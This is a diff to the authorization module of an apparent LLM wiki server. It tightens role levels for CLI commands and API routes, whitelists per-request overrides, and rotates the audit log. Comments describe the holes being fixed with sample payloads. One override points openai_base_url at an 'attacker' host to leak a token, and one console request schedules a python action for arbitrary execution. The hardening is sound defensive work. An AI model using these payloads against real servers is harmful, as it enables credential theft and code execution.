@@ -97,6 +97,9 @@ DEFAULT_SECURITY: Dict[str, Any] = {
     "cli": {"default_role": "admin", "require_login": False},
     "destructive": {"confirm_phrase": "DELETE INDEX", "require_reauth": True, "snapshot_before": True, "snapshot_keep": 3},
     "warn": {"confirm": True},
+    # 요청 단위 overrides(질의·평가·빌드 본문의 "overrides") 허용 조정. 기본 허용 목록은 web/server.py OVERRIDE_SAFE_KEYS
+    # (토글 전부 + top_k·컨텍스트·모델/effort·역할 정책·answer_mode). URL·헤더·경로·서버 운영 키는 admin 만.
+    "overrides": {"allow_extra": [], "deny": []},
 }
 
 
@@ -257,13 +260,16 @@ def parse_api_key(token: str) -> Optional[Tuple[str, str]]:
 _DESTRUCTIVE_CLI = {("build", "--purge-logs"), ("maintenance", "purge_requests"), ("config", "reset"), ("users", "remove")}
 _REBUILD_CLI = {("build", "--full"), ("build", "--reset"), ("build", "fts"), ("build", "vector"), ("build", "graph"), ("snapshot", "restore")}
 _READ_CLI = {"query", "search", "health", "stats", "requests", "logs", "forensic", "graph", "entity", "docs", "arch", "time",
-             "system", "corpus", "rules", "pin", "embed", "memory", "evolve", "preset", "prompts", "tuning", "config", "models",
-             "build", "precompute", "trial", "fusion", "eval", "mcp-source", "snapshot", "users", "security", "wiki", "apikey", "analyze"}
+             "system", "corpus", "rules", "graph-rules", "pin", "embed", "memory", "evolve", "preset", "prompts", "tuning", "config", "models",
+             "build", "precompute", "trial", "fusion", "eval", "mcp-source", "snapshot", "users", "security", "wiki", "apikey", "analyze",
+             "sweep"}     # 스윕은 rerun 재생의 반복 — 재실행과 같은 read 등급 (색인·설정을 바꾸지 않는다)
 _READ_CLI_ACTIONS = {  # (cmd, 첫 action) 이 이 집합이면 read.
     "build": {"status", "verify"}, "embed": {"report", "status", "runs"}, "memory": {"status", "episodes"}, "evolve": {"status", "review", "list", "feedback"},
     "preset": {"list", "show", "diff"}, "prompts": {"list", "show", "path"}, "tuning": {"show", "doc"}, "config": {"show", "paths"},
     "models": {"show", "test"}, "precompute": {"status"}, "trial": {"list", "compare", "report", "show"}, "mcp-source": {"list", "test", "enrich", "fetch"},
-    "rules": {"show", "test", "stats", "path"}, "pin": {"list", "test"}, "corpus": {"lint", "types", "schema", "example", "lint-file", "stats"},
+    "rules": {"show", "test", "explain", "stats", "path", "lint"},
+    # 그래프 빌드 규칙: 보기·점검·시험은 read, 사전을 고치는 add-entity/add-alias/fill-defaults 는 edit (아래 _EDIT_CLI)
+    "graph-rules": {"show", "types", "lint", "test", "path"}, "pin": {"list", "test"}, "corpus": {"lint", "types", "schema", "example", "lint-file", "stats"},
     "snapshot": {"list"}, "users": {"list"}, "security": {"show", "audit", "perms"}, "forensic": {"last", "list", "summary", "expect", "run"},
     "apikey": {"list"},
 }
@@ -271,7 +277,9 @@ _RUN_CLI = {"query", "search", "eval", "health", "fusion"}     # query/search �
 # 등급별 CLI 액션 (cmd, action) → level
 _EDIT_CLI = {("evolve", "apply"), ("evolve", "reject"), ("memory", "decay"), ("memory", "consolidate"), ("pin", "add"), ("pin", "remove"),
              ("rules", "add"), ("rules", "remove"), ("prompts", "reset"), ("tuning", "set"), ("tuning", "reset"), ("preset", "apply"), ("wiki", ""),
-             ("trial", "delete")}
+             ("trial", "delete"),
+             # 그래프 규칙 편집 — 다음 `build graph` 에서 그래프가 달라진다 (색인 자체를 지우지는 않으므로 edit)
+             ("graph-rules", "add-entity"), ("graph-rules", "add-alias"), ("graph-rules", "fill-defaults")}
 _INDEX_CLI = {("build", ""), ("build", "run"), ("precompute", "run"), ("precompute", "clear"), ("precompute", "doc-vectors"), ("snapshot", "create"),
               ("snapshot", "prune"), ("mcp-source", "ingest"), ("embed", "clear-cache"), ("watch", ""), ("watch", "--once")}
 
@@ -297,6 +305,10 @@ def classify_cli(argv: List[str]) -> Tuple[str, str]:
         return "index", "cli:build"
     if cmd == "build" and action == "verify":
         return ("index", "cli:build verify --fix") if "--fix" in rest else ("read", "cli:build verify")
+    if cmd == "reset":
+        # `reset <범위>` 는 기본이 **미리보기**(아무것도 바꾸지 않음) 이므로 read.
+        # `--apply` 가 붙어야 실제로 지우며, 그때만 destructive 등급이 된다 (2026-09-19).
+        return ("destructive", "cli:reset %s" % (action or "?")) if "--apply" in rest else ("read", "cli:reset preview")
     if cmd in ("users", "security", "config", "models", "apikey") and action not in _READ_CLI_ACTIONS.get(cmd, set()):
         if cmd == "security" and action == "perms" and len([a for a in rest if not a.startswith("-")]) <= 1:
             return "read", "cli:security perms"
@@ -327,19 +339,126 @@ def classify_cli(argv: List[str]) -> Tuple[str, str]:
         return "edit", "cli:%s %s" % (cmd, action)
     if cmd == "maintenance":
         return "index", "cli:maintenance %s" % action
-    return "edit", "cli:%s" % cmd
+    # 2026-09-19: 아래 다섯은 표 어디에도 없어 fallback(edit=class2)으로 떨어지고 있었다. 명시한다.
+    if cmd in ("inspect", "rerun"):
+        # 질의 해부·단계 재실행 — 색인도 설정도 바꾸지 않는다. Web 의 /api/debug/query·/api/query/rerun 과 같은 read.
+        return "read", "cli:%s" % cmd
+    if cmd == "optimize":
+        # 자료 묶음은 읽기지만 `--out` 은 **임의 경로에 파일을 쓴다** — 그 경우만 admin.
+        return ("admin", "cli:optimize --out") if "--out" in rest else ("read", "cli:optimize")
+    if cmd == "schedule":
+        # 보는 것은 read, 바꾸거나 **실행**하는 것은 admin. POST /api/schedule 이 admin 인데 콘솔로 우회되면 안 된다.
+        # add/run/trigger 는 scheduler.ACTION_TYPES 의 python·cli 를 통해 임의 실행에 이른다.
+        return ("read", "cli:schedule %s" % action) if action in ("list", "show", "history", "validate") \
+            else ("admin", "cli:schedule %s" % (action or "list"))
+    if cmd == "server":
+        # 상태 보기는 read, 제어(취소·제한·차단·세션·점검모드·kick)는 admin — /api/admin/server 와 같은 등급.
+        return ("read", "cli:server %s" % action) if action in ("status", "requests", "circuits") \
+            else ("admin", "cli:server %s" % (action or "status"))
+    # 표에 없는 명령은 **admin** 으로 떨어뜨린다 (예전에는 edit=class2 였다).
+    #
+    # 왜 바꿨나: `/api/cli`(Web 콘솔)가 이 표의 결과를 그대로 쓰고 `run_captured` 가 `gate=False` 로 실행한다.
+    # 그런데 `schedule` 이 어느 표에도 없어서 fallback 인 edit(class2)로 떨어졌고, 스케줄 동작에는
+    # `python`·`cli` 타입이 있다(scheduler.ACTION_TYPES). 즉 class2 가
+    # `POST /api/cli {"argv": "schedule add --task '{…\"action\":{\"type\":\"python\"…}}'"}` 한 번으로
+    # **서버 프로세스 권한 임의 실행**에 이를 수 있었다. 정작 `POST /api/schedule` 은 admin 이므로,
+    # 콘솔이 admin 게이트의 뒷문이 된 셈이다.
+    #
+    # 안전한 기본값은 "모르는 명령은 가장 높은 등급" 이다. 새 명령을 추가하면 위 표에 등급을 적어야 하고,
+    # 적지 않으면 admin 만 쓸 수 있다 — 조용히 낮은 등급으로 열리는 것보다 낫다.
+    # 개별 조정은 코드가 아니라 `security perms set 'cli:<명령> <액션>=<역할>'` 로 한다.
+    return "admin", ("cli:%s %s" % (cmd, action)) if action else ("cli:%s" % cmd)
+
+
+# ---------------------------------------------------------------- 요청 단위 overrides 화이트리스트
+# 왜 여기 있나: `apply_overrides` 는 Settings 의 **모든** 필드를 받아들인다. 읽기 등급(익명 포함)이
+# `{"overrides": {"openai_base_url": "http://attacker/v1"}}` 를 보내면 서버가 .env 의 PAT 를 그 주소로 보낸다
+# (CODE_REVIEW_0917 §0 P0-1). 2026-09-18 에 Web 경로에 이 검사를 넣었는데, **MCP 경로에는 없었다** —
+# `mcp._query_with` 가 도구 인자의 overrides 를 그대로 `request_scope` 에 넘겼고 `/mcp` 는 read 등급이라
+# `anonymous_role` 이 켜져 있으면 무인증으로 같은 일이 가능했다 (2026-09-19 발견).
+# 그래서 목록과 검사를 **창구가 아니라 auth 계층**으로 옮겼다. 질의를 실행하는 길이 새로 생겨도 같은 함수를 부르면 된다.
+OVERRIDE_SAFE_KEYS = frozenset({
+    "top_k_fts", "top_k_vector", "top_k_graph", "top_k_final", "graph_hops", "rrf_k",
+    "rerank_candidates", "rerank_chunk_chars", "context_max_chars", "context_chunk_chars", "answer_max_tokens",
+    "debug_level", "llm_provider", "llm_model", "llm_effort", "answer_effort", "llm_fallbacks", "embed_provider", "embed_model",
+    "llm_timeout", "llm_retries", "llm_retry_backoff_s", "llm_retry_backoff", "llm_retry_backoff_max_s", "llm_budget_s",
+    "llm_roles", "answer_mode", "output_mode", "query_cache_size", "llm_graph_budget", "llm_graph_min_chars",
+    "tuning",   # {"tuning": {키: 값}} — 요청 단위 튜닝 오버레이 (Pipeline.request_scope 가 T.set 으로 검증·적용, 파일에는 남지 않는다)
+})
+#: llm_roles 안에서 누구나 바꿀 수 있는 속성 (URL 류는 역할 속성이 아니므로 여기 없음).
+#
+# 2026-09-19: `circuit_failures`·`circuit_cooldown_s` 를 뺐다. 전역 철자인 `llm_circuit_failures`·
+# `llm_circuit_cooldown_s` 는 admin 전용인데 역할 철자는 누구나 쓸 수 있어서, **같은 손잡이가 철자에 따라
+# 권한이 달랐다**. 회로 차단은 "이 질의를 어떻게 찾을까" 가 아니라 **죽은 프로바이더를 계속 때리지 않게
+# 서버를 지키는 장치**다 — 요청자가 자기 요청만 예외로 만들 수 있으면 보호가 아니다.
+# 다시 열려면 코드가 아니라 `security.json` 의 `overrides.allow_extra` 에 전역 키를 넣고 admin 이 쓴다.
+OVERRIDE_ROLE_ATTRS = frozenset({"provider", "model", "effort", "timeout_s", "retries", "backoff_s", "backoff", "backoff_max_s", "budget_s",
+                                 "max_tokens", "ensemble", "frequency_penalty", "presence_penalty", "repeat_penalty"})
+
+
+def filter_overrides(ov: Optional[Dict[str, Any]], role: str, cfg: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    """요청 단위 overrides 에서 이 역할이 쓸 수 없는 키를 거른다. 금지 키가 있으면 403(AuthError).
+
+    조용히 버리지 않고 **이유를 돌려주는** 이유: 버리면 "설정이 안 먹는다" 로 보여 파이프라인 전체를 뒤지게 된다.
+    admin 은 `deny` 목록 외 전부 허용. 목록 조정은 `security.json` 의
+    `overrides.allow_extra`(추가 허용) / `overrides.deny`(admin 도 금지) — 코드 수정 없이.
+    """
+    if not ov:
+        return {}
+    from .config import Settings, Toggles, split_role_key
+    sec = (cfg or {}).get("overrides") or {}
+    allow_extra = {str(x) for x in (sec.get("allow_extra") or [])}
+    deny = {str(x) for x in (sec.get("deny") or [])}
+    is_admin = str(role or "") == "admin"
+    # 아예 **없는 키**는 역할과 무관하게 거절한다. `apply_overrides` 는 모르는 키를 조용히 버리므로,
+    # 오타 하나면 "설정이 안 먹는다" 가 되고 단서가 남지 않는다 (overrides.tuning 이 모르는 키를 400 으로
+    # 돌려주는 것과 같은 규칙). admin 도 예외가 아니다 — 오타는 권한과 관계가 없다.
+    unknown = [str(k) for k in ov
+               if str(k) != "tuning" and str(k) not in Settings.__dataclass_fields__
+               and str(k) not in Toggles.__dataclass_fields__ and not split_role_key(str(k))]
+    if unknown:
+        raise AuthError(400, "요청 단위 overrides 에 알 수 없는 키: %s — `config show --effective` 로 키 이름을 확인하세요 "
+                             "(튜닝 값은 overrides.tuning 안에 넣습니다)" % ", ".join(sorted(set(unknown))[:8]))
+    bad: List[str] = []
+    for k in ov:
+        ks = str(k)
+        if ks in deny:
+            bad.append(ks)
+            continue
+        if is_admin:
+            continue
+        if ks in Toggles.__dataclass_fields__ or ks in OVERRIDE_SAFE_KEYS or ks in allow_extra:
+            continue
+        rk = split_role_key(ks)
+        if rk and rk[1] in OVERRIDE_ROLE_ATTRS:
+            continue
+        bad.append(ks)
+    if not is_admin and isinstance(ov.get("llm_roles"), dict):
+        for role_name, rcfg in ov["llm_roles"].items():
+            for attr in (rcfg or {}) if isinstance(rcfg, dict) else []:
+                if attr not in OVERRIDE_ROLE_ATTRS:
+                    bad.append("llm_roles.%s.%s" % (role_name, attr))
+    if bad:
+        raise AuthError(403, "요청 단위 overrides 에 허용되지 않는 키: %s — URL·헤더·경로·서버 운영 설정은 admin 이 Settings 에서 저장해야 합니다 (security.json overrides.allow_extra 로 허용 가능)"
+                        % ", ".join(sorted(set(bad))[:8]))
+    return ov
 
 
 _READ_POST = ("/api/query", "/api/query/rerun",   # 재실행은 질의와 같은 등급 — 색인을 바꾸지 않고 읽기만 한다
-              "/api/search", "/api/feedback", "/api/evolve/propose", "/api/auth/login", "/api/auth/logout", "/api/auth/password",
+              "/api/sweep",                       # 스윕 = 재실행 N회 (llmwiki/sweep.py) — 재실행과 같은 등급
+              "/api/search",
+              "/api/debug/query",   # 질의 해부 — LLM 도 색인도 건드리지 않는 순수 읽기
+              "/api/feedback", "/api/evolve/propose", "/api/auth/login", "/api/auth/logout", "/api/auth/password",
               "/api/forensic/expect", "/api/forensic/llm", "/api/analysis/insight", "/api/time", "/mcp",
               "/api/auth/preview",   # 자기 권한을 낮춰 보는 것뿐 (올릴 수 없다)
               "/api/profile")   # 자기 화면 설정만 저장 (서버 설정을 바꾸지 않음 — llmwiki/profiles.py)
-_RUN_POST = ("/api/models/test", "/api/eval", "/api/fusion/compare", "/api/evolve/review")
-_EDIT_POST = ("/api/memory", "/api/evolve/apply", "/api/evolve/reject", "/api/wiki/page", "/api/rules", "/api/presets", "/api/prompts", "/api/pins",
+_RUN_POST = ("/api/models/test", "/api/models/test_catalog", "/api/eval", "/api/fusion/compare", "/api/evolve/review")
+_EDIT_POST = ("/api/memory", "/api/evolve/apply", "/api/evolve/reject",
+              "/api/evolve/auto_apply",   # 여러 제안을 한 번에 적용 — 개별 apply 와 같은 등급
+              "/api/wiki/page", "/api/rules", "/api/graph_rules", "/api/presets", "/api/prompts", "/api/pins",
               "/api/query_rules", "/api/tuning")
 _ADMIN_POST = ("/api/config", "/api/models/set", "/api/agents", "/api/auth/users", "/api/security", "/api/apikeys",
-               "/api/admin/server", "/api/schedule", "/api/models/catalog")
+               "/api/admin/server", "/api/schedule", "/api/models/catalog", "/api/env")   # /api/env: .env 다시 읽기 (값은 마스킹돼도 admin 전용)
 
 
 def classify_api(method: str, path: str, body: Dict[str, Any]) -> Tuple[str, str]:
@@ -347,11 +466,14 @@ def classify_api(method: str, path: str, body: Dict[str, Any]) -> Tuple[str, str
     body = body or {}
     act = str(body.get("action") or "")
     if method == "GET":
-        if path in ("/api/auth/users", "/api/audit", "/api/security", "/api/apikeys", "/api/admin/server"):
+        if path in ("/api/auth/users", "/api/audit", "/api/security", "/api/apikeys", "/api/admin/server", "/api/env", "/api/docacl"):
             return "admin", path
         return "read", path
     if path == "/api/activity":
         return "read", "activity cancel"      # 본인 요청 취소 (서버가 소유자 검사; admin 은 전부)
+    if path == "/api/models/automap":
+        # 제안만 받는 것(apply 없음)은 연결 테스트와 같은 run 등급, 실제로 config.json 에 꽂는 것은 admin.
+        return ("admin", "models automap --apply") if body.get("apply") else ("run", "models automap")
     if path == "/api/build":
         if body.get("purge_logs"):
             return "destructive", "build --full --purge-logs"
@@ -362,6 +484,9 @@ def classify_api(method: str, path: str, body: Dict[str, Any]) -> Tuple[str, str
         return "index", "build (incremental)"
     if path == "/api/maintenance":
         return ("destructive", "maintenance purge_requests") if act == "purge_requests" else ("index", "maintenance " + act)
+    if path == "/api/reset":
+        # 관리자 초기화 (2026-09-19). GET 미리보기는 위에서 read 로 떨어진다 — 실행만 destructive 다.
+        return "destructive", "reset %s" % (body.get("scope") or "?")
     if path == "/api/cli":
         argv = body.get("argv") or []
         if isinstance(argv, str):
@@ -385,6 +510,9 @@ def classify_api(method: str, path: str, body: Dict[str, Any]) -> Tuple[str, str
         if act == "scan":
             return "read", "watch scan"
         return ("admin", "watch %s (save)" % act) if body.get("save") else ("index", "watch " + act)
+    if path == "/api/docacl":
+        # 문서 접근 제어 규칙은 보안 설정이다. 영향 확인(check)도 "어떤 문서가 가려지는가" 를 그대로 보여 주므로 admin.
+        return "admin", "docacl " + (act or "check")
     if path == "/api/precompute":
         return "index", "precompute " + (act or "run")
     if path == "/api/collab":
@@ -1042,8 +1170,39 @@ def reset_sessions() -> None:
     _SESSIONS = None
 
 
+_AUDIT_LOCK = threading.Lock()
+_AUDIT_CFG: Dict[str, Any] = {"max_mb": 20.0, "backups": 5}   # config.json audit_max_mb / audit_backups (logging_setup.setup_from_settings 가 configure_audit 로 반영)
+
+
+def configure_audit(max_mb: Any = 20, backups: Any = 5) -> None:
+    """audit.jsonl 로테이션 기준을 바꾼다. max_mb<=0 이면 로테이션 없음."""
+    try:
+        _AUDIT_CFG["max_mb"] = float(max_mb or 0)
+    except (TypeError, ValueError):
+        _AUDIT_CFG["max_mb"] = 20.0
+    try:
+        _AUDIT_CFG["backups"] = max(0, int(backups or 0))
+    except (TypeError, ValueError):
+        _AUDIT_CFG["backups"] = 5
+
+
+def _rotate_audit(path: str, backups: int) -> None:
+    """audit.jsonl → .1, .1 → .2 … (backups 개까지). backups=0 이면 비운다. RotatingFileHandler.doRollover 와 같은 규칙."""
+    if backups <= 0:
+        open(path, "w", encoding="utf-8").close()
+        return
+    last = "%s.%d" % (path, backups)
+    if os.path.exists(last):
+        os.remove(last)
+    for i in range(backups - 1, 0, -1):
+        src = "%s.%d" % (path, i)
+        if os.path.exists(src):
+            os.replace(src, "%s.%d" % (path, i + 1))
+    os.replace(path, path + ".1")
+
+
 def write_audit(user: Optional[User], op: str, level: str, ok: bool, ip: str = "", detail: Any = None, error: str = "") -> None:
-    """logs/audit.jsonl 한 줄. Web(Auth.audit) 과 CLI 게이트가 함께 쓴다."""
+    """logs/audit.jsonl 한 줄. Web(Auth.audit) 과 CLI 게이트가 함께 쓴다. audit_max_mb 를 넘으면 audit.jsonl.1 … 로 로테이션(audit_backups 개)."""
     rec = {"ts": time.time(), "time": time.strftime("%Y-%m-%d %H:%M:%S"), "user": user.name if user else None, "role": user.role if user else None,
            "via": user.via if user else None, "ip": ip, "op": op, "level": level, "ok": ok}
     if detail is not None:
@@ -1051,10 +1210,19 @@ def write_audit(user: Optional[User], op: str, level: str, ok: bool, ip: str = "
     if error:
         rec["error"] = error[:300]
     try:
+        line = (json.dumps(rec, ensure_ascii=False) + "\n").encode("utf-8")
         d = path_for("logs_dir")
         os.makedirs(d, exist_ok=True)
-        with open(os.path.join(d, "audit.jsonl"), "a", encoding="utf-8") as f:
-            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
+        p = os.path.join(d, "audit.jsonl")
+        max_bytes = int(float(_AUDIT_CFG.get("max_mb") or 0) * 1024 * 1024)
+        with _AUDIT_LOCK:
+            if max_bytes > 0 and os.path.exists(p) and os.path.getsize(p) + len(line) > max_bytes:
+                try:
+                    _rotate_audit(p, int(_AUDIT_CFG.get("backups") or 0))
+                except OSError:
+                    pass
+            with open(p, "ab") as f:
+                f.write(line)
     except Exception:
         pass
 
